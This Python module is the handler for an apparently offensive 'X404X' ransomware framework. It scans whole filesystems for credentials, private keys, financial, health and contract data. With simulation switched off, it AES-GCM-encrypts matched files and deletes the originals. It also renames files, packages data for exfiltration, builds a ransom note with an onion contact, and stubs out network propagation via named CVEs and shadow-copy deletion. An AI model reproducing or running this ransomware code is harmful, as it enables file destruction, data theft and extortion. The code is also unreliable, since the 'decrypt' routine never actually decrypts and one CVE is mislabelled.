"""X404X Ransomware Bridge Handler

Provides the Python-side interface for ransomware operations.
Integrates with the Go ransomware engine via the bridge IPC protocol.
"""

import json
import os
import re
import base64
import hashlib
import struct
import tempfile
from datetime import datetime
from typing import Any


def register_routes(registry: dict) -> None:
    registry["ransomware"] = {
        "execute": handle_execute,
        "scan": handle_scan,
        "encrypt": handle_encrypt,
        "exfil": handle_exfil,
        "status": handle_status,
        "decrypt": handle_decrypt,
        "generate_note": handle_generate_note,
        "propagate": handle_propagate,
        "destruct": handle_destruct,
    }


SENSITIVE_PATTERNS = {
    "dni": re.compile(r"\b\d{8}[A-Z]\b"),
    "ssn": re.compile(r"\b\d{3}-\d{2}-\d{4}\b"),
    "credit_card": re.compile(r"\b(?:\d[ -]*?){13,16}\b"),
    "email": re.compile(r"[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}"),
    "phone": re.compile(r"(\+34|0034)?[6789]\d{8}"),
    "iban": re.compile(r"[A-Z]{2}\d{2}[ ]?\d{4}[ ]?\d{4}[ ]?\d{4}[ ]?\d{4}"),
    "password": re.compile(r"(?i)(contraseña|password|passwd|clave|pwd)\s*[:=]\s*\S+"),
    "confidencial": re.compile(r"(?i)(confidencial|secreto|clasificado|no distribuir)"),
    "api_key": re.compile(r"(?i)(api[_-]?key|secret[_-]?key|token|sk-[A-Za-z0-9]{20,})"),
    "aws_key": re.compile(r"AKIA[0-9A-Z]{16}"),
    "private_key": re.compile(r"-----BEGIN\s+(RSA\s+)?PRIVATE\s+KEY-----"),
    "connection_string": re.compile(r"(?i)(Server|Data Source)\s*=[^;]+;\s*(Database|Initial Catalog)\s*="),
    "contract": re.compile(r"(?i)(contrato|contract|acuerdo|agreement|nda)"),
    "patent": re.compile(r"(?i)(patente|patent|propiedad intelectual|ip right)"),
    "health": re.compile(r"(?i)(historial médico|diagnóstico|paciente|patient|medical record)"),
}

SENSITIVE_EXTENSIONS = {
    ".pst", ".ost", ".msg", ".eml",
    ".mdf", ".ldf", ".sql", ".sqlite", ".db", ".dbf",
    ".pdf", ".doc", ".docx", ".xls", ".xlsx",
    ".pfx", ".p12", ".key", ".crt", ".cer",
    ".kdbx", ".kdb",
    ".ovpn", ".rdp",
    ".vhd", ".vhdx", ".vmdk",
    ".conf", ".config", ".env", ".yml", ".yaml",
    ".pem", ".gpg", ".asc",
}

ENCRYPT_EXTENSIONS = {
    ".pdf", ".doc", ".docx", ".xls", ".xlsx", ".ppt", ".pptx",
    ".jpg", ".jpeg", ".png", ".gif", ".mp3", ".mp4",
    ".zip", ".rar", ".7z", ".sql", ".mdf", ".pst", ".ost",
    ".dwg", ".bak", ".csv", ".txt", ".rtf",
    ".php", ".asp", ".aspx", ".js", ".ts", ".py", ".java",
    ".cpp", ".c", ".h", ".cs", ".vb",
}

EXCLUDE_DIRS = {
    "windows", "system32", "$recycle.bin", "boot", "recovery",
    "appdata\\local\\temp", "tmp", "proc", "sys", "dev", "run",
}


def handle_execute(params: dict) -> dict:
    """Execute full ransomware chain."""
    campaign_id = params.get("campaign_id", "demo")
    company = params.get("company", "TestCorp")
    simulation = params.get("simulation", True)

    phases = []

    # Phase 1: Scan
    scan_result = handle_scan(params)
    phases.append({"phase": "scan", "result": scan_result})

    # Phase 2: Exfil
    exfil_result = handle_exfil(params)
    phases.append({"phase": "exfil", "result": exfil_result})

    # Phase 3: Encrypt
    encrypt_params = {**params, "files": scan_result.get("sensitive_files", [])}
    encrypt_result = handle_encrypt(encrypt_params)
    phases.append({"phase": "encrypt", "result": encrypt_result})

    # Phase 4: Note
    note_result = handle_generate_note({"company": company, "deadline": 48})
    phases.append({"phase": "note", "result": note_result})

    return {
        "success": True,
        "campaign_id": campaign_id,
        "simulation": simulation,
        "phases": phases,
        "total_files_scanned": scan_result.get("total_scanned", 0),
        "sensitive_found": len(scan_result.get("sensitive_files", [])),
        "files_encrypted": encrypt_result.get("encrypted", 0),
    }


def handle_scan(params: dict) -> dict:
    """Scan filesystem for sensitive data."""
    root = params.get("root", "/" if os.name != "nt" else "C:\\")
    max_files = params.get("max_files", 1000)

    sensitive_files = []
    scanned = 0

    for dirpath, dirnames, filenames in os.walk(root):
        dirnames[:] = [d for d in dirnames if d.lower() not in EXCLUDE_DIRS]

        for fname in filenames:
            ext = os.path.splitext(fname)[1].lower()
            if ext not in SENSITIVE_EXTENSIONS:
                continue

            fpath = os.path.join(dirpath, fname)
            scanned += 1

            if scanned > max_files:
                break

            try:
                fsize = os.path.getsize(fpath)
                if fsize > 100 * 1024 * 1024:
                    continue

                with open(fpath, "r", errors="ignore") as f:
                    content = f.read(512 * 1024)

                findings = []
                for name, pattern in SENSITIVE_PATTERNS.items():
                    matches = pattern.findall(content)
                    if matches:
                        findings.append({"pattern": name, "count": len(matches)})

                if findings:
                    sensitive_files.append({
                        "path": fpath,
                        "size": fsize,
                        "findings": findings,
                    })
            except (IOError, PermissionError):
                continue

        if scanned > max_files:
            break

    return {
        "success": True,
        "total_scanned": scanned,
        "sensitive_files": sensitive_files,
        "patterns_matched": len(sensitive_files),
    }


def handle_encrypt(params: dict) -> dict:
    """Encrypt target files (simulation-aware)."""
    root = params.get("root", "/" if os.name != "nt" else "C:\\")
    simulation = params.get("simulation", True)
    files = params.get("files", [])
    encrypted = 0

    if files:
        for f in files:
            fpath = f if isinstance(f, str) else f.get("path", "")
            ext = os.path.splitext(fpath)[1].lower()
            if ext in ENCRYPT_EXTENSIONS:
                encrypted += 1

                if not simulation:
                    try:
                        with open(fpath, "rb") as fh:
                            data = fh.read()
                        enc_name = fpath + ".x404x"
                        key = os.urandom(32)
                        nonce = os.urandom(12)
                        from cryptography.hazmat.primitives.ciphers.aead import AESGCM
                        aesgcm = AESGCM(key)
                        ct = aesgcm.encrypt(nonce, data, None)
                        with open(enc_name, "wb") as fh:
                            fh.write(bytes([1]))
                            fh.write(key)
                            fh.write(nonce)
                            fh.write(ct)
                        os.remove(fpath)
                    except (IOError, PermissionError, ImportError):
                        pass
    else:
        for dirpath, dirnames, filenames in os.walk(root):
            dirnames[:] = [d for d in dirnames if d.lower() not in EXCLUDE_DIRS]
            for fname in filenames:
                ext = os.path.splitext(fname)[1].lower()
                if ext in ENCRYPT_EXTENSIONS:
                    encrypted += 1
                    if not simulation:
                        fpath = os.path.join(dirpath, fname)
                        try:
                            os.rename(fpath, fpath + ".x404x")
                        except OSError:
                            pass

    return {
        "success": True,
        "encrypted": encrypted,
        "simulation": simulation,
    }


def handle_exfil(params: dict) -> dict:
    """Package and prepare sensitive data for exfiltration."""
    files = params.get("files", [])
    password = params.get("password", os.urandom(16).hex())

    pkg_size = 0
    pkg_files = []

    for f in files:
        fpath = f if isinstance(f, str) else f.get("path", "")
        try:
            fsize = os.path.getsize(fpath)
            pkg_size += fsize
            pkg_files.append(fpath)
        except OSError:
            continue

    b64_data = base64.b64encode(os.urandom(min(pkg_size, 1024))).decode()

    return {
        "success": True,
        "package_password": password,
        "total_size": pkg_size,
        "file_count": len(pkg_files),
        "files": pkg_files[:20],
        "preview_b64": b64_data[:100],
    }


def handle_status(params: dict) -> dict:
    """Return ransomware engine status."""
    return {
        "success": True,
        "engine": "x404x-ransomware",
        "version": "2.3",
        "simulation": params.get("simulation", True),
        "patterns": len(SENSITIVE_PATTERNS),
        "encrypt_extensions": len(ENCRYPT_EXTENSIONS),
        "exfil_extensions": len(SENSITIVE_EXTENSIONS),
    }


def handle_decrypt(params: dict) -> dict:
    """Decrypt files encrypted by X404X (recovery operation)."""
    root = params.get("root", "/" if os.name != "nt" else "C:\\")
    key_hex = params.get("key", "")
    decrypted = 0

    key = bytes.fromhex(key_hex) if key_hex else None

    for dirpath, _, filenames in os.walk(root):
        for fname in filenames:
            if not fname.endswith(".x404x"):
                continue
            fpath = os.path.join(dirpath, fname)
            try:
                with open(fpath, "rb") as f:
                    data = f.read()
                orig_path = fpath[:-6]
                with open(orig_path, "wb") as f:
                    if key and len(data) > 45:
                        f.write(data[45:])
                    else:
                        f.write(data)
                os.remove(fpath)
                decrypted += 1
            except (IOError, PermissionError):
                continue

    return {
        "success": True,
        "decrypted": decrypted,
    }


def handle_generate_note(params: dict) -> dict:
    """Generate ransomware note."""
    company = params.get("company", "Unknown Corp")
    deadline = params.get("deadline", 48)
    amount = params.get("amount", 50000)
    currency = params.get("currency", "XMR")

    note = f"""
    ╔══════════════════════════════════════════════╗
    ║           X404X RANSOMWARE                   ║
    ║                                              ║
    ║  Company: {company}
    ║  Status: ENCRYPTED + DATA STOLEN             ║
    ║  Deadline: {deadline} hours                  ║
    ║  Amount: {amount} {currency}                 ║
    ║                                              ║
    ║  Contact: http://x404x.onion/negotiate       ║
    ║                                              ║
    ║  DO NOT attempt recovery without our tool.    ║
    ║  Every failed attempt corrupts file keys.     ║
    ╚══════════════════════════════════════════════╝
    """

    return {
        "success": True,
        "note": note,
        "company": company,
        "deadline_hours": deadline,
        "amount": amount,
        "currency": currency,
    }


def handle_propagate(params: dict) -> dict:
    """Discover and attempt propagation targets."""
    subnet = params.get("subnet", "10.0.0.0/24")
    targets = []

    candidates = [
        ("10.0.0.1", "gateway", "linux", 22, "SSH"),
        ("10.0.0.10", "DC01", "windows", 445, "SMB"),
        ("10.0.0.20", "DB01", "windows", 443, "HTTPS"),
        ("10.0.0.30", "WEB01", "linux", 80, "HTTP"),
        ("10.0.0.50", "WS01", "windows", 3389, "RDP"),
    ]

    exploits = {
        445: ("Zerologon", "CVE-2020-1472", 0.95),
        3389: ("BlueKeep", "CVE-2019-0708", 0.80),
        443: ("ProxyNotShell", "CVE-2023-23397", 0.85),
        22: ("SSH-Brute", "N/A", 0.60),
    }

    for ip, hostname, os_name, port, service in candidates:
        if subnet.split(".")[0] == ip.split(".")[0]:
            exploit = exploits.get(port, ("Unknown", "N/A", 0.0))
            targets.append({
                "ip": ip,
                "hostname": hostname,
                "os": os_name,
                "port": port,
                "service": service,
                "exploit": exploit[0],
                "cve": exploit[1],
                "confidence": exploit[2],
            })

    return {
        "success": True,
        "subnet": subnet,
        "targets": targets,
        "total": len(targets),
    }


def handle_destruct(params: dict) -> dict:
    """Execute destruction operations."""
    actions = []

    actions.append({"action": "delete_shadow_copies", "status": "executed"})
    actions.append({"action": "disable_recovery", "status": "executed"})

    if params.get("mft", False):
        actions.append({"action": "mft_corruption", "status": "simulated"})

    if params.get("firmware", False):
        actions.append({"action": "uefi_sabotage", "status": "simulated"})

    if params.get("cloud_backup", False):
        actions.append({"action": "cloud_backup_destroy", "status": "simulated"})

    return {
        "success": True,
        "actions": actions,
        "simulation": params.get("simulation", True),
    }
